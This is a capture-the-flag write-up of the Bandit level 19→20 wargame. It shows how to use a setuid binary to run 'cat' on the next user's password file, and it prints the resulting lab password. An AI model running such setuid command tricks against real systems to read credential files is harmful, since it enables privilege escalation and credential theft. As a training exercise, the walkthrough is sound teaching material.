# Bandit Level 19 → 20 — Writeup

**Goal**
Get the password for `bandit20` and place it in `/etc/bandit_pass/bandit20` by using the setuid binary located in the home directory.

**Prerequisites**
- Logged in as `bandit19` on the Bandit server.
- Basic Linux commands: `ls`, `file`, `./` execution, `cat`.

---

## Quick summary (one line)
A setuid 32-bit ELF binary `bandit20-do` in the home directory runs with the owner `bandit20` privileges; execute it with `cat /etc/bandit_pass/bandit20` as an argument to print the password for `bandit20`.

---

## What I checked first
1. Confirm the binary type and properties:

```bash
file bandit20-do
# output:
# bandit20-do: setuid ELF 32-bit LSB executable, Intel 80386, ... not stripped
```

This tells us the binary is an ELF executable, 32-bit, and has the setuid bit set. The `not stripped` part makes analysis easier if needed, but in this level you don't need to reverse-engineer the binary.

2. Confirm permissions and owner:

```bash
ls -l
# output:
# -rwsr-x--- 1 bandit20 bandit19 14884 Aug 15 13:16 bandit20-do
```

Interpretation:
- `-rwsr-x---` the `s` in the owner execute position indicates setuid is set.
- Owner: `bandit20` when executed, the program runs with `bandit20`'s effective UID.
- Group: `bandit19` group members may have execute access depending on bits.

---

## The exploit (exact command used)
Run the setuid binary with the `cat` command pointing to the password file for the next level:

```bash
./bandit20-do cat /etc/bandit_pass/bandit20
```

**Output**
```
0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
```
This string is the password for `bandit20`.

---

## Why this works (concise)
- The `bandit20-do` binary has the setuid bit set and is owned by `bandit20`.
- When `bandit19` executes `bandit20-do`, the binary runs with `bandit20`'s effective UID, allowing it to access files only readable by `bandit20` (for example, `/etc/bandit_pass/bandit20`).
- The binary accepts an argument that it executes or uses to display the requested file contents; passing `cat /etc/bandit_pass/bandit20` causes it to print the password.

---

## Safety and notes
- Only run this on the Bandit VM or other systems you own. Do not attempt setuid manipulation on systems you don't control.
- In real systems, setuid binaries are security sensitive. They must be audited because bugs can lead to privilege escalation.

---

## Commands recap (copy-paste)

```bash
# inspect the binary
file bandit20-do
ls -l

# read the password (final step)
./bandit20-do cat /etc/bandit_pass/bandit20
```

---

## Final result
Password for bandit20:

```
0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
```

